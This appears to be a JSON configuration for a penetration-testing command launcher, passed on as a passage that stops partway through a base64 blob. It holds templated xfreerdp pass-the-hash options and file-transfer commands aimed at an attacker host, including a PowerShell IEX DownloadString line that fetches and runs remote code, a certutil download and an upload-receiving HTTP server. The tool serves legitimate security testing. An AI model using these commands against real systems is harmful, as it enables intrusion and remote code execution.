[
  {
    "id": "rdp",
    "keywords": ["rdp", "xfreerdp", "3389"],
    "cmds": [
      {
        "win": 0,
        "label": "XfreeRDP",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "xfreerdp /timeout:60000 /cert-ignore /compression /clipboard /dynamic-resolution /w:1280 /h:700 /port:__RDP_TARGET_PORT__ /v:__TARGET_HOST__ __DOMAIN_AUTH__ /u:'__USERNAME__' __PASSWORD_AUTH__ __SMB_SHARE_ENABLED__ __XFREERDP_ADMIN__ __XFREERDP_PROXY__",
        "code": [],
        "config": [
          {
            "help": "Enter the username",
            "replace": "__USERNAME__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: Username"
            }
          },
          {
            "help": "Set the RDP Port to connect on, default 3389",
            "replace": "__RDP_TARGET_PORT__",
            "defaultValue": 3389,
            "props": {
              "type": "number",
              "label": "RDP Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          },
          {
            "help": "Enable an SMB share to be served from the current working directory (eg, from kali). This share will be available to the RDP target host.",
            "replace": "__SMB_SHARE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable SMB Share in RDP session",
              "replaceValue": "/drive:share,__SMB_SHARE_CWD__"
            }
          },
          {
            "help": "XfreeRDP can share a local folder (local to the RDP client machine aka local to the machine connecting to the RDP server aka local to the attacking machine, kali). This SMB share will be available while the RDP session is connected. This allows for quick and easy upload/download of data (from the RDP server to kali) while in the RDP session without a complicated setup. Default is to include the current working directory (. period). Alternatively supply a path to another folder to share.",
            "replace": "__SMB_SHARE_CWD__",
            "defaultValue": ".",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "SMB Shared directory path (on Kali)"
            }
          },

          {
            "help": "Enable the DOMAIN flag to specify which DOMAIN for authentication",
            "replace": "__DOMAIN_AUTH__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable DOMAIN auth",
              "replaceValue": "/d:'__DOMAIN__'"
            }
          },
          {
            "help": "Enter the auth DOMAIN",
            "replace": "__DOMAIN__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: DOMAIN"
            }
          },
          {
            "help": "Select password authentication (plaintext creds or NTLM password hash aka pass-the-hash)",
            "replace": "__PASSWORD_AUTH__",
            "defaultValue": "/p:'__PASSWORD__'",
            "props": {
              "type": "radio",
              "label": "Select password auth method",
              "options": [
                {
                  "replace": "/p:'__PASSWORD__'",
                  "label": "Enable password authentication"
                },
                {
                  "replace": "/pth:'__PASSWORD_HASH__'",
                  "label": "Enable pass-the-hash authentication"
                }
              ]
            }
          },
          {
            "help": "Password as plaintext",
            "replace": "__PASSWORD__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: Password (plaintext)"
            }
          },
          {
            "help": "NTLM Password Hash as plaintext",
            "replace": "__PASSWORD_HASH__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Auth: NTLM Password Hash (pth)"
            }
          },

          {
            "help": "Enable the 'admin' session",
            "replace": "__XFREERDP_ADMIN__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable /admin (or console) session",
              "replaceValue": "/admin"
            }
          },
          {
            "help": "Enable use of a proxy for the RDP connection to connect via (/proxy:[<proto>://][<user>:<password>@]<host>:<port>). NOTE: DO NOT USE WITH PROXYCHAINS",
            "replace": "__XFREERDP_PROXY__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable proxy flags",
              "replaceValue": "/proxy:'__XFREERDP_PROXY_PROTO__://__XFREERDP_PROXY_AUTH____XFREERDP_PROXY_HOST__:__XFREERDP_PROXY_PORT__'"
            }
          },
          {
            "help": "Select the proxy protocol to utilize, xfreerdp default is http",
            "replace": "__XFREERDP_PROXY_PROTO__",
            "defaultValue": "http",
            "props": {
              "type": "select",
              "label": "Proxy Protocol",
              "customInput": false,
              "options": ["http", "socks5"]
            }
          },
          {
            "help": "Proxy BASIC authentication. Format is 'USERNAME:PASSWORD@' (separate username and password with colon ending with an @). Default is blank",
            "replace": "__XFREERDP_PROXY_AUTH__",
            "defaultValue": "USERNAME:PASSWORD@",
            "validationRegex": "^[^:@]+:[^@]+@$",
            "validationHelp": "Format: USERNAME:PASSWORD@",
            "props": {
              "type": "string",
              "label": "Proxy Auth"
            }
          },
          {
            "help": "Proxy hostname or ipv4. default localhost",
            "replace": "__XFREERDP_PROXY_HOST__",
            "defaultValue": "localhost",
            "props": {
              "type": "string",
              "label": "Proxy Hostname or IPv4"
            }
          },
          {
            "help": "Proxy port. Default 1080",
            "replace": "__XFREERDP_PROXY_PORT__",
            "defaultValue": 1080,
            "props": {
              "type": "number",
              "label": "Proxy Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          }
        ]
      }
    ]
  },
  {
    "id": "http-download",
    "keywords": [
      "download",
      "http",
      "curl",
      "iwr",
      "get",
      "80",
      "8080",
      "certutil"
    ],
    "cmds": [
      {
        "win": 0,
        "label": "Powershell iwr",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "iwr http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -outfile __FILE__"
      },
      {
        "win": 0,
        "label": "Powershell iex",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "IEX(New-Object System.Net.WebClient).DownloadString('http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__')"
      },
      {
        "win": 0,
        "label": "curl Linux",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "curl __EXTRA_CURL_LINUX_FLAGS__ -m __TIMEOUT_SEC__ -L http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -o __FILE__",
        "config": [
          {
            "help": "Set the curl timeout in seconds before the command will stop and return back to the terminal, irrespective if the download was finished or not. Default is around 120 seconds.",
            "replace": "__TIMEOUT_SEC__",
            "defaultValue": 10,
            "props": {
              "type": "number",
              "label": "Timeout Seconds",
              "InputProps": {
                "inputProps": {
                  "min": 0,
                  "max": 300
                }
              }
            }
          },
          {
            "help": "Enter any extra flags for this CURL command, default blank (none)",
            "replace": "__EXTRA_CURL_LINUX_FLAGS__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Extra Curl Flags"
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "CertUtil.exe Windows",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "certutil.exe -urlcache -split -f __ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ __FILE__",
        "code": []
      },
      {
        "win": 0,
        "label": "curl Windows",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "curl -OL http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__",
        "code": []
      },
      {
        "win": 1,
        "label": "python custom http server",
        "platform": "linux|windows",
        "terminal": ["ps", "cmd", "sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "python custom_server.py __CUSTOM_HTTP_SERVER_PORT__",
        "code": [
          {
            "filename": "custom_server.py",
            "data": "aW1wb3J0IGh0dHAuc2VydmVyCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBwYXJzZV9xcywgdXJscGFyc2UKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBvcy5wYXRoCiMgaW1wb3J0IGpzb24KCmRlZiBtYWluKFBPUlQpOgogICAgY2xhc3MgQ3VzdG9tSFRUUFJlcXVlc3RIYW5kbGVyKGh0dHAuc2VydmVyLlNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlcik6CiAgICAgICAgCiAgICAgICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICAgICAgIyBEZWJ1ZyB0aGUgR0VUIHJlcXVlc3QgcGFyYW1ldGVycwogICAgICAgICAgICBwYXJzZWRfdXJsID0gdXJscGFyc2Uoc2VsZi5wYXRoKQogICAgICAgICAgICBwYXJhbWV0ZXJzID0gcGFyc2VfcXMocGFyc2VkX3VybC5xdWVyeSkKICAgICAgICAgICAgcHJpbnQoIj09PUdFVD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3BhcnNlZF91cmwucGF0aH1cblBhcmFtZXRlcnM6IHtwYXJzZWRfdXJsLnF1ZXJ5fSIpCgogICAgICAgICAgICByZXF1ZXN0ZWRfcGF0aCA9IHNlbGYudHJhbnNsYXRlX3BhdGgoc2VsZi5wYXRoKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhyZXF1ZXN0ZWRfcGF0aCk6CiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXUiLCAibm9ybWFsIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXQiLCAiNjAwMCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9kb2N1bWVudC1zYXZlLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIyMDAgLSBGaWxlIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsibm90aWZ5LXNlbmQiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdSIsICJub3JtYWwiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnLWknLCAiL3Vzci9zaGFyZS9pY29ucy9nbm9tZS80OHg0OC9hY3Rpb25zL3Byb2Nlc3Mtc3RvcC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYiR0VUIHtwYXJzZWRfdXJsLnBhdGh9IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiNDA0IC0gTk9UIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKCiAgICAgICAgICAgICMgSWYgdGhlIGZpbGUgZXhpc3RzIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeSwgc2VydmUgaXQsIG90aGVyd2lzZSBzZW5kIGEgNDA0LgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzdXBlcigpLmRvX0dFVCgpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KGYiZXJyb3IgZW5jb3VudGVyZWQgd2hpbGUgc2VydmluZzoge3BhcnNlZF91cmwucGF0aH0iKQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJub3RpZnktc2VuZCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi10IiwgIjYwMDAiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICctaScsICIvdXNyL3NoYXJlL2ljb25zL2dub21lLzQ4eDQ4L2FjdGlvbnMvcHJvY2Vzcy1zdG9wLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICI1MDAgLSBJbnRlcm5hbCBFcnJvciIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0pCgogICAgICAgIGRlZiBkb19QT1NUKHNlbGYpOgogICAgICAgICAgICAjIGZvciBmaWxlIHVwbG9hZHMsIGV4cGVjdCBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0gYW5kIC91cGxvYWQgcm91dGUKICAgICAgICAgICAgaWYgc2VsZi5wYXRoLmxvd2VyKCkgPT0gJy91cGxvYWQnOgogICAgICAgICAgICAgICAgcHJpbnQoJ2ZpbGUgdXBsb2FkJykKCiAgICAgICAgICAgICAgICBjb250ZW50X2xlbmd0aCA9IGludChzZWxmLmhlYWRlcnNbJ0NvbnRlbnQtTGVuZ3RoJ10pCiAgICAgICAgICAgICAgICBib2R5ID0gc2VsZi5yZmlsZS5yZWFkKGNvbnRlbnRfbGVuZ3RoKQoKICAgICAgICAgICAgICAgICMgVE9ETzogcmFuZG9taXplIHRoaXMgZmlsZW5hbWUgaW4gdGhlIHRtcC8gZm9sZGVyCiAgICAgICAgICAgICAgICAjIFRPRE86IGVuc3VyZSB0aGUgdG1wIGZvbGRlciBleGlzdHMgd2hlbiBzdGFydGluZyB0aGlzIHNjcmlwdAogICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gJ3RtcC91cGxvYWQxLmZpbGUnCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAnd2InKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoYm9keSkKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQnKQoKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAjIGZvciBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQgb3IgbXVsdGlwYXJ0L2Zvcm0tZGF0YSBhdCBhbnkgcm91dGU6CiAgICAgICAgICAgICAgICAjIERlYnVnIHRoZSBQT1NUIHJlcXVlc3QgYm9keQogICAgICAgICAgICAgICAgY29udGVudF9sZW5ndGggPSBpbnQoc2VsZi5oZWFkZXJzLmdldCgnQ29udGVudC1MZW5ndGgnKSkKICAgICAgICAgICAgICAgIHBvc3RfZGF0YSA9IHNlbGYucmZpbGUucmVhZChjb250ZW50X2xlbmd0aCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMgQXNzdW1pbmcgUE9TVCBkYXRhIGlzIHNlbnQgYXMgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcgb3IgJ211bHRpcGFydC9mb3JtLWRhdGEnCiAgICAgICAgICAgICAgICAjcG9zdF92YXJzID0gcGFyc2VfcXMocG9zdF9kYXRhLmRlY29kZSgndXRmLTgnKSwga2VlcF9ibGFua192YWx1ZXM9VHJ1ZSkKICAgICAgICAgICAgICAgIHByaW50KCI9PT1QT1NUPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgICAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3NlbGYucGF0aH1cbkJvZHk6IHtwb3N0X2RhdGF9IikKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgICMgUHJvdmlkZSBhIHJlc3BvbnNlIHRvIHRoZSBjbGllbnQKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQgYW5kIGxvZ2dlZC4nKQoKICAgIHdpdGggaHR0cC5zZXJ2ZXIuSFRUUFNlcnZlcigoJycsIFBPUlQpLCBDdXN0b21IVFRQUmVxdWVzdEhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KGYiU2VydmluZyBhdCBwb3J0IHtQT1JUfSIpCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IlN0YXJ0IGFuIEhUVFAgc2VydmVyIG9uIGEgc3BlY2lmaWMgcG9ydC4iKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgncG9ydCcsIHR5cGU9aW50LCBoZWxwPSJQb3J0IHRvIHN0YXJ0IHRoZSBIVFRQIHNlcnZlciBvbiIpCiAgICBhcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQoKICAgIHRyeToKICAgICAgICBtYWluKGFyZ3MucG9ydCkKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5DbG9zaW5nIHNlcnZlci4uLiIpCgo=",
            "sha256": "0373a699442f2b49399d92455a5c7ff605d653d9b8e01750d2781dede0932d02"
          }
        ],
        "config": [
          {
            "help": "Set the HTTP server port",
            "replace": "__CUSTOM_HTTP_SERVER_PORT__",
            "defaultValue": 8081,
            "props": {
              "type": "number",
              "label": "Custom HTTP Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          }
        ]
      },
      {
        "win": 1,
        "label": "Python3 -m http.server",
        "platform": "linux|windows",
        "terminal": ["ps", "cmd", "sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "python__PYTHON_BIN_3__ -m http.server __ENABLE_HTTP_SERVER_BIND_TO_ADDRESS__ __CUSTOM_HTTP_SERVER_PORT__",
        "code": [],
        "config": [
          {
            "help": "Set the HTTP server port",
            "replace": "__CUSTOM_HTTP_SERVER_PORT__",
            "defaultValue": 8081,
            "props": {
              "type": "number",
              "label": "Custom HTTP Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          },
          {
            "help": "On some systems the Python binary is differentiated from Python version 2 by naming it python3. This adds the 3 to the command string for you",
            "replace": "__PYTHON_BIN_3__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Python binary is named Python3",
              "replaceValue": "3"
            }
          },
          {
            "help": "Default is to host the webserver on all interfaces. There are times when it might be useful to only host it on a given interface and/or address. This option enables the flag to this.",
            "replace": "__ENABLE_HTTP_SERVER_BIND_TO_ADDRESS__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable bind to specific ipv4 address",
              "replaceValue": "--bind __CUSTOM_HTTP_SERVER_BIND_ADDRESS__"
            }
          },
          {
            "help": "Enter the IPv4 Address to bind the python simple http server to",
            "replace": "__CUSTOM_HTTP_SERVER_BIND_ADDRESS__",
            "defaultValue": "__ATTACKER_HOST__",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "Bind IPv4 Address"
            }
          }
        ]
      }
    ]
  },
  {
    "id": "terminal-multiplexer",
    "keywords": ["tmux", "screen"],
    "cmds": [
      {
        "win": 0,
        "label": "new_screen SESSION",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "new_screen __NEW_SCREEN_SESSION_NAME__",
        "code": [],
        "config": [
          {
            "help": "Enter the name for the gnu screen session. This will also be used within the log filenames which have a pattern of slog{SESSION_NAME}.{LOG_NUMBER} and will be output in the current directory. NOTE: this command does NOT check if logs exist already and could overwrite them. Supply a new SESSION_NAME for each run",
            "replace": "__NEW_SCREEN_SESSION_NAME__",
            "defaultValue": "session1",
            "validationRegex": ".{1,}",
            "validationHelp": "Session Name must be at least 1 character",
            "props": {
              "type": "string",
              "label": "Session Name"
            }
          }
        ]
      },
      {
        "win": 1,
        "label": "py_logs - search screen logs",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "py_logs __PYLOGS_SLOG_GLOB__ __PYLOGS_FIND_ENABLED__ __PYLOGS_INCLUDE_ENABLED__ __PYLOGS_EXCLUDE_ENABLED__ __PYLOGS_NO_COLOR__ __PYLOGS_UNIQUE_RESULTS_ENABLED__ __PYLOGS_FIND_CASESENSITIVE_ENABLED__",
        "code": [],
        "config": [
          {
            "help": "This parameter will have a glob '*' (asterisk) applied at the end to find all files matching the pattern at the path provided. This allows for py_logs to use multiple log files to get the content from them.",
            "replace": "__PYLOGS_SLOG_GLOB__",
            "defaultValue": "./slogsession1.",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "path to slog{SESSION_NAME} log files"
            }
          },
          {
            "help": "When enabled, this will only return unique commands from all logs provided. The default behavior is to always sort the output with the newest run commands being at the end of the output.",
            "replace": "__PYLOGS_UNIQUE_RESULTS_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable unique results ",
              "replaceValue": "-u"
            }
          },
          {
            "help": "Enable the find flag for py_logs alias command (~/logs.py)",
            "replace": "__PYLOGS_FIND_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable find flag",
              "replaceValue": "-f '__PYLOGS_FIND_SEARCH_TERM__' __PYLOGS_FIND_WHERE_ENABLED__"
            }
          },
          {
            "help": "enter a command or some text that might be in the logs. When ran, this will search the given logs and try to find the value.",
            "replace": "__PYLOGS_FIND_SEARCH_TERM__",
            "defaultValue": "",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "What to find with py_logs"
            }
          },
          {
            "help": "Inclusion allows for sniping out returned values from the results of the logs. This allows the user to provide a string that matches the pattern of 'n-' or 'n-i' or multiple ranges via 'n-i,m,o,p-q'. This will include anything that matches the indices provided, or their ranges. If no number is provided after a hyphen, then the range will match all values from n up.",
            "replace": "__PYLOGS_INCLUDE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable the include flag",
              "replaceValue": "-i '__PYLOGS_INCLUDE_RANGE__'"
            }
          },
          {
            "help": "See help for Enabling the include flag. Default '0-' aka include all indices in all logs provided",
            "replace": "__PYLOGS_INCLUDE_RANGE__",
            "defaultValue": "0-",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "include range"
            }
          },
          {
            "help": "Exclude a range of indices from the output, this will shorten the output. The range can be from one number to another, or open ended (eg, 0-). Or comma separate various ranges to exclude specific commands. See Enable include flag help for more info.",
            "replace": "__PYLOGS_EXCLUDE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable the exclude flag",
              "replaceValue": "-x '__PYLOGS_EXCLUDE_RANGE__'"
            }
          },
          {
            "help": "See help for Enabling the exclude flag. Default '1-' aka exclude all but the first (0th) index",
            "replace": "__PYLOGS_EXCLUDE_RANGE__",
            "defaultValue": "1-",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "exclude range"
            }
          },
          {
            "help": "Much like other Linux/Unix commands, disabling color output is an optional flag. This will disable the color output for the py_logs alias of ~/logs.py",
            "replace": "__PYLOGS_NO_COLOR__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable the --no-color flag",
              "replaceValue": "--no-color"
            }
          },
          {
            "help": "Case sensitive searching enables being even more specific with the searched term. The default is case-insensitive search.",
            "replace": "__PYLOGS_FIND_CASESENSITIVE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable Case Sensitive searching for the provided search term",
              "replaceValue": "--case"
            }
          },
          {
            "help": "Where flag will allow for searching in the logs for command results that match the search term, or in the commands only or in both (aka all)",
            "replace": "__PYLOGS_FIND_WHERE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "enable selecting where to search for the given search term to find.",
              "replaceValue": "--where '__PYLOGS_FIND_WHERE_OPTION__'"
            }
          },
          {
            "help": "See help for the checkbox that enables this feature to the left",
            "replace": "__PYLOGS_FIND_WHERE_OPTION__",
            "defaultValue": "all",
            "props": {
              "type": "select",
              "label": "Select an option for where to search for the term provided",
              "customInput": false,
              "options": ["all", "cmd", "result"]
            }
          }
        ]
      },
      {
        "win": 2,
        "label": "setup custom GNU screen",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "__CUSTOM_SCREEN_LOGGING_ZSHRC__ __CUSTOM_SCREEN_LOGGING_APT_INSTALL__",
        "code": [
          {
            "data": "",
            "filename": "logs.py",
            "sha256": "b5fc732270918d8c258969cc71d97de9886c8f431ced1266e3711136df233ae0"
          },
          {
            "data": "IyEvYmluL2Jhc2gKCiMgY3VzdG9tIGFsaWFzIGZvciBsYXVuY2hpbmcgdGhlIHB5dGhvbiBsb2dzIHNjcmlwdDoKYWxpYXMgcHlfbG9ncz0icHl0aG9uIC9ob21lL2thbGkvbG9ncy5weSIKCiMgQ3VzdG9tIGZuIGZvciBTY3JlZW4gTG9nZ2luZyAoc2xvZykKIyBGdW5jdGlvbiB0byBleGVjdXRlIGJlZm9yZSBlYWNoIGNvbW1hbmQgd2l0aCB5b3VyIGNvbW1hbmQgYXMgYXJndW1lbnQKIyBjdXN0b21pemVkIHRvIHByaW50IGEgdGltZXN0YW1wIGFuZCB0aGUgY29tbWFuZCB0byBiZSBlYXNpbHkgZ3JhYmJlZCBmcm9tIGxvZyBmaWxlcy4KIyBzaG91bGQgbWFzc2l2ZWx5IHNpbXBsaWZ5IHNjcmVlbiBsb2dnaW5nIGFuZCByZXBvcnQgd3JpdGluZwpmdW5jdGlvbiBwcmVleGVjKCkgewogICAgX2N1c3RvbV90aW1lc3RhbXA9IltjbWRfVFM6JChkYXRlICcrJXMgJXkvJW0vJWQgJVQnKV0gJDEgWy9jbWRfVFNdIgoKIyBOT1RFOiBwcmludHMgd2l0aCBjb2xvciBBTkQgcHJlc2VydmVzIGFueSBlc2NhcGUgc2VxdWVuY2luZyB0aGUgdXNlciBoYXMgaW5wdXQKICAgIHByaW50IC1uUCAiJUZ7Z3JlZW59IgogICAgcHJpbnQgLXJuICIkX2N1c3RvbV90aW1lc3RhbXAiCiAgICBwcmludCAtUCAiJWYiCn0KCiMgY3VzdG9tIHNjcmVlbiBzdGFydGVyIGZ1bmN0aW9uCm5ld19zY3JlZW4oKXsKICBpZiBbIC16ICIkMSIgXSB8fCBbICIkMSIgPSAiLWgiIF0gfHwgWyAiJDEiID0gIi0taGVscCIgXTsgdGhlbgogICAgZWNobyAibmV3X3NjcmVlbiBoZWxwOiIKICAgIGVjaG8gIlVzYWdlOiBuZXdfc2NyZWVuIFNFU1NJT05fTkFNRSIKICAgIGVjaG8gIiIKICAgIGVjaG8gIkhlbHA6IgogICAgZWNobyAiICAgIC1oLCAtLWhlbHAiCiAgICBlY2hvICIiCiAgICBlY2hvICJSZXF1aXJlZCBBcmdzOiIKICAgIGVjaG8gIiAgICBTRVNTSU9OX05BTUUgICAgICAgICAgICAgVGhlIG5hbWUgdXNlZCBmb3IgdGhlIHNjcmVlbiBzZXNzaW9uIGFuZCB3aXRoaW4iCiAgICBlY2hvICIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGUgbG9nIGZpbGUgbmFtZXMgb2YgcGF0dGVybiAnc2xvZ3tTRVNTSU9OX05BTUV9LntMT0dfTlVNQkVSfSciCiAgICBlY2hvICIiCgogICAgcmV0dXJuIDEK